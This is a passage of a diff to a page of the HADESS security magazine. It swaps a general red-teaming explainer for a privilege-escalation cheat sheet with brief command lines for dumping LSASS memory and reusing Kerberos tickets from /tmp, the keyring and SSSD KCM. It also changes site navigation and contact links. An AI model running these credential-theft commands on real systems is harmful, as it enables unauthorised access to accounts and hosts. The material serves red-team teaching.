@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1222,7 +1234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/43-methods-for-privilege-escalation-part-3#article","headline":"43 Methods for Privilege Escalation (Part 3) — HADESS Magazine","description":"In this article, we continue the article 43 methods for privilege escalation. If you haven't read the previous part yet, visit the blog.","url":"https://hadesssecurity.github.io/blog/read/43-methods-for-privilege-escalation-part-3","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/43-methods-for-privilege-escalation-part-3"},"datePublished":"August 19, 2022","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/08/1-min-2.webp"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/43-methods-for-privilege-escalation-part-3#article","headline":"43 Methods for Privilege Escalation (Part 3) — HADESS Magazine","description":"In this article, we continue the article 43 methods for privilege escalation. If you haven't read the previous part yet, visit the blog.","url":"https://hadesssecurity.github.io/blog/read/43-methods-for-privilege-escalation-part-3","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/43-methods-for-privilege-escalation-part-3"},"datePublished":"August 19, 2022","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/08/1-min-2.webp"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1275,14 +1287,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1300,16 +1311,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1326,8 +1337,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1539,435 +1550,1781 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2022/08/1-min-2.webp">
       
-<p class="wp-block-paragraph">As defined by the U.S. National Security Agency (NSA), a <a href="https://www.techtarget.com/whatis/definition/red-teaming" target="_blank" rel="noreferrer noopener"><mark style="background-color:rgba(0, 0, 0, 0);color:#100bf9" class="has-inline-color"><strong>red team</strong></mark></a> is an entity that specializes in breaking &amp; entering, acquiring classified information, and leaving no trace behind. In the cyber realm, Red teams focus on penetration testing of different systems and their levels of security.</p>
+<p class="wp-block-paragraph">If you are not yet familiar with the concept of privilege escalation, you can refer to article <a href="/74-methods-for-privilege-escalationpart-2/" target="_blank" rel="noreferrer noopener"><strong><mark style="background-color:rgba(0, 0, 0, 0);color:#1e20ed" class="has-inline-color">43 Privilege Escalation</mark></strong></a> Methods.</p>
 
 
 
-<p class="wp-block-paragraph">In other words </p>
+<h3 class="wp-block-heading" id="h-dump-lsass-with-silentprocessexit"><strong>Dump lsass with SilentProcessExit</strong></h3>
 
 
 
-<p class="wp-block-paragraph">In the high-stakes world of cybersecurity, companies constantly seek ways to fortify their defenses. One proactive measure they rely on is &#8220;red teaming.&#8221; But what exactly does this term entail, and why is it crucial in the modern cybersecurity landscape?</p>
+<p class="wp-block-paragraph">Domain: No</p>
 
 
 
-<p class="wp-block-paragraph">At its core, &#8220;red teaming&#8221; is a form of adversarial simulation. Drawing its name from military exercises where a &#8220;red team&#8221; represents the enemy force. in cybersecurity, it means having a group of ethical hackers attempt to breach a company&#8217;s digital defenses. Their purpose is not malicious but instructive; they expose vulnerabilities before real cybercriminals can exploit them.</p>
+<p class="wp-block-paragraph">Local Admin: Yes</p>
 
 
 
-<p class="wp-block-paragraph">They help detect, prevent, and eliminate weaknesses while putting a spotlight on glaring vulnerabilities. A<mark style="background-color:rgba(0, 0, 0, 0);color:#0a0cbe" class="has-inline-color"> </mark><a href="/red-teaming/" target="_blank" rel="noreferrer noopener"><mark style="background-color:rgba(0, 0, 0, 0);color:#2d09c3" class="has-inline-color"><strong>red team</strong></mark> </a>goes about this by imitating real-world cyber &#8211; using all existing data/network penetration techniques. This helps organizations identify the vulnerabilities that can pose a threat to their system.</p>
+<p class="wp-block-paragraph">OS: Windows</p>
 
 
 
-<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-1 is-layout-flex wp-block-gallery-is-layout-flex"><div class="wp-block-image">
-<figure class="aligncenter size-large"><img fetchpriority="high" decoding="async" width="1000" height="523" data-id="7669" src="/wp-content/uploads/2023/10/1-min-1.webp" alt="what is red team in cybersecurity?" class="wp-image-7669" srcset="/wp-content/uploads/2023/10/1-min-1.webp 1000w, /wp-content/uploads/2023/10/1-min-1-300x157.webp 300w, /wp-content/uploads/2023/10/1-min-1-768x402.webp 768w" sizes="(max-width: 1000px) 100vw, 1000px" /></figure>
-</div></figure>
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunting</p>
 
 
 
-<h2 class="wp-block-heading"><strong>Red Team vs. Blue Team</strong></h2>
-
-
-
-<p class="wp-block-paragraph">Within the context of cybersecurity, there&#8217;s often a distinction made between the Red Team and the Blue Team. The Red Team, as previously discussed, is the offensive side &#8211; they simulate cyberattacks. Conversely, the Blue Team specializes in defense, working to detect and mitigate threats. The dynamic interplay between these two sides is essential in ensuring comprehensive cybersecurity.</p>
-
-
-
-<p class="wp-block-paragraph">The concepts of &#8220;Red Team&#8221; and &#8220;Blue Team&#8221; originate from military war-gaming but have been adopted into the world of cybersecurity to describe two distinct roles. These roles help organizations test and improve their security measures through simulated adversarial engagements. Here&#8217;s a more detailed breakdown:</p>
-
-
-
-<h3 class="wp-block-heading"><strong>Red Team (Offensive Security)</strong></h3>
-
-
-
-<h4 class="wp-block-heading"><strong>1. Role</strong></h4>
-
-
-
-<p class="wp-block-paragraph">The Red Team represents the attackers or the adversaries.</p>
-
-
-
-<h4 class="wp-block-heading"><strong>2. Objective</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Their goal is to simulate realistic cyberattacks on an organization. By doing so, they attempt to exploit vulnerabilities in the system, whether they&#8217;re technological, physical, or human (like social engineering tactics).</p>
-
-
-
-<h4 class="wp-block-heading"><strong>3. Methods</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Penetration Testing:</strong> This is where ethical hackers actively try to exploit known vulnerabilities in the system.</li>
-</ul>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Targeted Attacks:</strong> They might attempt to gain access to specific data or areas of the network to simulate a directed attack.</li>
-</ul>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Social Engineering:</strong> This includes tactics like phishing emails or pretexting to manipulate individuals into giving up sensitive information.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading"><strong>4. Benefits</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>Exposes potential vulnerabilities in a system before they can be exploited by actual malicious entities.</li>
-
-
-
-<li>Offers a realistic assessment of how an organization might stand up against real-world cyberattacks.</li>
-</ul>
-
-
-
-<h3 class="wp-block-heading"><strong>Blue Team (Defensive Security)</strong></h3>
-
-
-
-<h4 class="wp-block-heading"><strong>1. Role</strong></h4>
-
-
-
-<p class="wp-block-paragraph">The Blue Team stands opposite the Red Team, representing the defenders.</p>
-
-
-
-<h4 class="wp-block-heading"><strong>2. Objective</strong></h4>
-
-
-
-<p class="wp-block-paragraph">Their main aim is to detect, thwart, and respond to the simulated attacks from the Red Team. They&#8217;re responsible for protecting the organization&#8217;s assets.</p>
-
-
-
-<h4 class="wp-block-heading"><strong>3. Methods</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Intrusion Detection Systems (IDS):</strong> These systems monitor network traffic to detect suspicious activities.</li>
-</ul>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Firewalls:</strong> They help to block unauthorized access.</li>
-</ul>
-
-
-
-<p class="wp-block-paragraph"><strong>Incident Response:</strong> This involves procedures and plans on how to respond when a security breach is detected.</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Regular System Patching:</strong> To ensure that known vulnerabilities are fixed.</li>
-</ul>
-
-
-
-<h4 class="wp-block-heading"><strong>4. Benefits</strong></h4>
-
-
-
-<ul class="wp-block-list">
-<li>Helps in refining and testing an organization&#8217;s incident response and security measures.</li>
-
-
-
-<li>Provides real-time experience in handling and defending against cyberattacks.</li>
-</ul>
-
-
-
-<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-2 is-layout-flex wp-block-gallery-is-layout-flex"><div class="wp-block-image">
-<figure class="aligncenter size-large"><img decoding="async" width="1024" height="576" data-id="7681" src="/wp-content/uploads/2023/10/1-min-1-1-1024x576.webp" alt="Red Team vs Blue Team and what is blue team" class="wp-image-7681" srcset="/wp-content/uploads/2023/10/1-min-1-1-1024x576.webp 1024w, /wp-content/uploads/2023/10/1-min-1-1-300x169.webp 300w, /wp-content/uploads/2023/10/1-min-1-1-768x432.webp 768w, /wp-content/uploads/2023/10/1-min-1-1.webp 1280w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-</div></figure>
-
-
-
-<h3 class="wp-block-heading"><strong>The Interplay</strong></h3>
-
-
-
-<p class="wp-block-paragraph">The dynamic between the Red Team and the Blue Team is not adversarial in intent; it&#8217;s constructive. The Red Team&#8217;s findings allow the Blue Team to improve defenses, patch vulnerabilities, and refine incident response procedures.</p>
-
-
-
-<p class="wp-block-paragraph">In many modern security frameworks, there&#8217;s a continuous feedback loop between the two teams. Some organizations also introduce a &#8220;Purple Team,&#8221; which blends the roles of red and blue, focusing on collaboration and knowledge sharing to bolster security measures.</p>
-
-
-
-<p class="wp-block-paragraph">In summary, &#8220;Red Team vs. Blue Team&#8221; in cybersecurity describes a scenario where one team actively tries to exploit (Red Team) and the other team defends and responds (Blue Team) to ensure robust security measures for an organization.</p>
-
-
-
-<h2 class="wp-block-heading"><strong>The Benefits of Red Teaming</strong></h2>
-
-
-
-<p class="wp-block-paragraph">Red teaming&#8221; in the context of cybersecurity refers to a proactive approach where an independent group actively tries to penetrate and exploit an organization&#8217;s cybersecurity defenses to find vulnerabilities. This simulated adversarial activity helps the organization understand potential threats and weaknesses in their systems. Here are the benefits of red teaming:</p>
-
-
-
-<h3 class="wp-block-heading"><strong>1. Real-world Attack Simulation</strong></h3>
-
-
-
-<p class="wp-block-paragraph">Red teams replicate the techniques, tactics, and procedures of real-world adversaries. This realistic simulation helps organizations understand how actual threat actors might target and compromise their systems.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>2. Identification of Blind Spots</strong></h3>
-
-
-
-<p class="wp-block-paragraph">Automated tools and traditional vulnerability assessments might not identify all potential threats. Red teams think and operate like genuine attackers, uncovering vulnerabilities that might be overlooked in standard tests.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>3. Validation of Defense Mechanisms</strong></h3>
-
-
-
-<p class="wp-block-paragraph">By actively attempting to bypass security controls, red teaming tests the effectiveness of an organization&#8217;s defense mechanisms, including firewalls, intrusion detection systems, and personnel responses.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>4. Testing Incident Response</strong></h3>
-
-
-
-<p class="wp-block-paragraph">A red team exercise gives the organization a chance to evaluate its incident response process in a controlled environment. They can see how quickly and effectively their blue team (defense) responds to a perceived threat.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>5. Comprehensive Reporting</strong></h3>
-
-
-
-<p class="wp-block-paragraph">Post-evaluation, organizations receive a detailed report from the red team. This report provides insights into vulnerabilities discovered, the methods used to exploit them, and recommendations for mitigation.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>6. Employee Awareness and Training</strong></h3>
-
-
-
-<p class="wp-block-paragraph">Red teaming often involves tactics like phishing and social engineering. When employees fall for these tactics in a controlled simulation, it serves as a direct training opportunity, increasing awareness and preparedness for real-world scenarios.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>7. Regulatory Compliance</strong></h3>
-
-
-
-<p class="wp-block-paragraph">Some industries require regular security assessments as part of regulatory compliance. Red teaming can help meet these requirements, ensuring that organizations aren&#8217;t just checking a box but are genuinely prepared for potential threats.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>8. Stakeholder Confidence</strong></h3>
-
-
-
-<p class="wp-block-paragraph">Demonstrating a proactive approach to cybersecurity can boost confidence among stakeholders, including investors, customers, and partners. They can be assured that the organization is taking robust measures to protect its assets and data.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>9. Prioritization of Resources</strong></h3>
-
-
-
-<p class="wp-block-paragraph">With insights from red teaming, organizations can make informed decisions about where to allocate resources. They can prioritize fixing vulnerabilities that pose the highest risk.</p>
-
-
-
-<figure class="wp-block-gallery has-nested-images columns-default is-cropped wp-block-gallery-3 is-layout-flex wp-block-gallery-is-layout-flex"><div class="wp-block-image">
-<figure class="aligncenter size-large"><img decoding="async" width="1024" height="633" data-id="7686" src="/wp-content/uploads/2023/10/1-min-2-1024x633.webp" alt="Analysis and investigation to establish security by the red team" class="wp-image-7686" srcset="/wp-content/uploads/2023/10/1-min-2-1024x633.webp 1024w, /wp-content/uploads/2023/10/1-min-2-300x186.webp 300w, /wp-content/uploads/2023/10/1-min-2-768x475.webp 768w, /wp-content/uploads/2023/10/1-min-2.webp 1164w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
-</div></figure>
-
-
-
-<h3 class="wp-block-heading"><strong>10. Continuous Improvement</strong></h3>
-
-
-
-<p class="wp-block-paragraph">Cyber threats are constantly evolving. Regular red team exercises ensure that an organization&#8217;s cybersecurity strategies evolve and adapt to the ever-changing threat landscape.</p>
-
-
-
-<h3 class="wp-block-heading"><strong>The Main Benefits of The Red Team</strong></h3>
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
 
 
 
 <ol class="wp-block-list">
-<li><strong>Real-world Simulation:</strong> Unlike automated tests, a Red Team can think and adapt like real-world attackers, offering insights into how genuine threats might operate.</li>
-
-
-
-<li><strong>Unbiased Perspective:</strong> Being external entities, they provide an unbiased view of a company&#8217;s cybersecurity posture.</li>
-
-
-
-<li><strong>Comprehensive Analysis:</strong> Post-evaluation, organizations receive detailed reports on vulnerabilities, giving them actionable insights to improve their security stance.</li>
+<li>SilentProcessExit.exe pid</li>
 </ol>
 
 
 
-<p class="wp-block-paragraph">In summary, red teaming offers a proactive, holistic, and realistic assessment of an organization&#8217;s cybersecurity posture. By identifying vulnerabilities and testing defenses in a controlled environment, organizations can bolster their security measures, ensuring they&#8217;re well-equipped to face real-world cyber threats.</p>
+<h3 class="wp-block-heading" id="h-lsass-shtinkering"><strong>Lsass Shtinkering</strong></h3>
 
 
 
-<h2 class="wp-block-heading"><strong>Trends in Red Teaming</strong></h2>
+<p class="wp-block-paragraph">Domain: No</p>
 
 
 
-<p class="wp-block-paragraph"> With the rise in cyber threats, red teaming has seen several trends. One notable trend is the increasing reliance on VR simulations to create realistic cyberattack scenarios. Additionally, as companies become more ecologically aware, there&#8217;s a push towards sustainable cybersecurity practices. Our article on sustainable cybersecurity delves deeper into this trend.</p>
+<p class="wp-block-paragraph">Local Admin: Yes</p>
 
 
 
-<p class="wp-block-paragraph"><strong>Choosing the Right Red Team:</strong> Not all red teams are created equal. When selecting a team for your organization, ensure they have:</p>
+<p class="wp-block-paragraph">OS: Windows</p>
 
 
 
-<ul class="wp-block-list">
-<li>A proven track record in the cybersecurity domain.</li>
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunting</p>
 
 
 
-<li>Expertise tailored to your industry.</li>
-
-
-
-<li>An approach that aligns with your organization&#8217;s goals and culture.</li>
-</ul>
-
-
-
-<h2 class="wp-block-heading" id="h-red-teaming-assessment"><strong>Red Teaming Assessment</strong></h2>
-
-
-
-<p class="wp-block-paragraph">A red team assessment is a goal-based adversarial activity that requires a big-picture, holistic view of the organization from the perspective of an adversary. This assessment process is designed to meet the needs of complex organizations handling a variety of sensitive assets through technical, physical, or process-based means.</p>
-
-
-
-<p class="wp-block-paragraph">The purpose of conducting a red teaming assessment is to demonstrate how real world attackers can combine seemingly unrelated exploits to achieve their goal. It is an effective way to show that even the most sophisticated firewall in the world means very little if an attacker can walk out of the data center with an unencrypted hard drive. Instead of relying on a single network appliance to secure sensitive data, it’s better to take a defense in depth approach and continuously improve your people, process, and technology.</p>
-
-
-
-<p class="wp-block-paragraph">Prior to the assessment, rules of engagement are established between the Red Team members and the smallest possible set of participants within the organization to be tested.&nbsp; This number will vary but is typically no more than 5 people in key positions to view the organizations0 detection and response activities.&nbsp; Based on the rules of engagement, a Red Team may target any or all of the following areas during the exercise:</p>
-
-
-
-<ul class="wp-block-list">
-<li><strong>Technology defenses</strong>: In order to reveal potential vulnerabilities and risks within hardware and software-based systems like networks, applications, routers, switches, and appliances.</li>
-
-
-
-<li><strong>Human defenses</strong>: Often the weakest link in any organization’s cyber defenses, Red Teaming will target staff, independent contractors, departments, and business partners to ensure they’re all as secure as possible.</li>
-
-
-
-<li><strong>Physical defenses</strong>: Physical security around offices, warehouses, substations, data centers, and buildings are just as important as technology defenses, and as such should be stress tested against a genuine attack. Something as seemingly innocuous as holding a secure door open for someone without having them tap in can provide the gap an attacker needs to gain access to unauthorized systems.</li>
-</ul>
-
-
-
-<h2 class="wp-block-heading"><strong>How does Red Teaming work?</strong></h2>
-
-
-
-<p class="wp-block-paragraph">When vulnerabilities that seem small on their own are tied together in an attack path, they can cause significant damage.</p>
-
-
-
-<h2 class="wp-block-heading"><strong>Red Team Methodology</strong></h2>
-
-
-
-<p class="wp-block-paragraph">Red teams emulate every step that a hacker would follow along the cyber kill chain. It requires being intelligent, clever, and the ability to think outside of normal processes. The tools used to support a red team are diverse but can be grouped into categories based on the flow shown below.</p>
-
-
-
-<figure class="wp-block-image"><img decoding="async" src="https://lh4.googleusercontent.com/R3txk7afQeZYkjcZs66NicGsqeZnd-Acjt3IrGUbxXiXA2LioQF33Xntp8M1mg_2ah0y4YgZd9_LwrpavFjGyXGyLAxyjxN7Brt9Sj3p4yVgMX0IdnggsVq0FdNLJX3RMhqfmztoKIJKHZirFQ" alt=""/></figure>
-
-
-
-<h2 class="wp-block-heading"><strong>What Are 3 Questions To Consider Before A Red Teaming Assessment?</strong></h2>
-
-
-
-<p class="wp-block-paragraph">Every red team assessment caters to different organizational elements. However, the methodology always includes the same elements of reconnaissance, enumeration, and attack. Before conducting a red team assessment, talk to your organization’s key stakeholders to learn about their concerns. Here are a few questions to consider when identifying the goals of your upcoming assessment:</p>
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
 
 
 
 <ol class="wp-block-list">
-<li>What could happen in my organization to cause serious reputational or revenue-based damage (e.g. ex-filtration of sensitive client data or prolonged service downtime)?</li>
+<li>HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps-&gt;2</li>
 
 
 
-<li>What is the common infrastructure used throughout the organization (consider both hardware and software)? In other words, is there a common component on which everything relies?</li>
-
-
-
-<li>What are the most valuable assets throughout the organization (data and systems) and what are the repercussions if those are compromised?</li>
+<li>LSASS_Shtinkering.exe pid</li>
 </ol>
 
 
 
-<h2 class="wp-block-heading"><strong>What Are The Goals Of A Red Team?</strong></h2>
+<h3 class="wp-block-heading" id="h-andrewspecial"><strong>AndrewSpecial</strong></h3>
 
 
 
-<p class="wp-block-paragraph">A Red Team can be made up of as many as two people and can scale to over 20, depending on the task. That’s what is most important—make sure that your team is built for the task at hand. Find experienced, critical thinkers to form the core of your team and continue building it with a diverse mix of skills. A Red Team should be used alongside your vulnerability assessment and <a href="/penetration_testing/" target="_blank" rel="noreferrer noopener"><mark style="background-color:rgba(0, 0, 0, 0);color:#5411dd" class="has-inline-color"><strong>penetration testing</strong></mark></a> in order to realize its full value.</p>
+<p class="wp-block-paragraph">Domain: No</p>
 
 
 
-<ol class="wp-block-list">
-<li><strong>Have the right condition</strong>: Red teamers need an open learning culture with the ability to continuously train and improve their skill set.<br></li>
+<p class="wp-block-paragraph">Local Admin: Yes</p>
 
 
 
-<li><strong>Set a clear objective</strong>: Plan from the outset. This will not work as an afterthought but should be an integral part of your security posture and should have measurable goals in mind.</li>
-</ol>
+<p class="wp-block-paragraph">OS: Windows</p>
 
 
 
-<ol class="wp-block-list" start="3">
-<li><strong>Get the right tools</strong>: Make sure that you provide your team with the right testing, vulnerability management, and further assessment tools for analysis.</li>
-</ol>
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunting</p>
 
 
 
-<ol class="wp-block-list" start="4">
-<li><strong>Focus on key issue</strong>: Red teaming should produce quality thinking and advice, not qualitative results.</li>
-</ol>
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
 
 
 
-<h2 class="wp-block-heading"><strong>Conclusion</strong></h2>
+<ul class="wp-block-list">
+<li>AndrewSpecial.exe</li>
+</ul>
 
 
 
-<p class="wp-block-paragraph">In an era where cyber threats evolve daily, staying a step ahead is paramount. Red teaming offers businesses the opportunity to test their defenses rigorously, ensuring they&#8217;re prepared for real-world cyberattacks. It&#8217;s not about finding faults but fortifying fortresses.</p>
+<h3 class="wp-block-heading" id="h-ccache-ticket-reuse-from-tmp"><strong>CCACHE ticket reuse from /tmp</strong></h3>
 
 
 
-<p class="wp-block-paragraph">Ready to put your cybersecurity measures to the test? Experience the power of real-world simulation and fortify your defenses with our top-tier Breach and Attack Simulation (BAS) platforms. <a href="/blog/" target="_blank" rel="noreferrer noopener"><mark style="background-color:rgba(0, 0, 0, 0);color:#0a4aec" class="has-inline-color"><strong>Discover more and elevate your cybersecurity today</strong></mark></a>.</p>
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunting</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>ls /tmp/ | grep krb5cc_X</li>
+
+
+
+<li>export KRB5CCNAME=/tmp/krb5cc_X</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-ccache-ticket-reuse-from-keyring"><strong>CCACHE ticket reuse from keyring</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunting</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>https://github.com/TarlogicSecurity/tickey</li>
+
+
+
+<li>/tmp/tickey -i</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-ccache-ticket-reuse-from-sssd-kcm"><strong>CCACHE ticket reuse from SSSD KCM</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunting</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>git clone https://github.com/fireeye/SSSDKCMExtractor</li>
+
+
+
+<li>python3 SSSDKCMExtractor.py &#8211;database secrets.ldb &#8211;key secrets.mkey</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-ccache-ticket-reuse-from-keytab"><strong>CCACHE ticket reuse from keytab</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux/Windows/Mac</p>
+
+
+
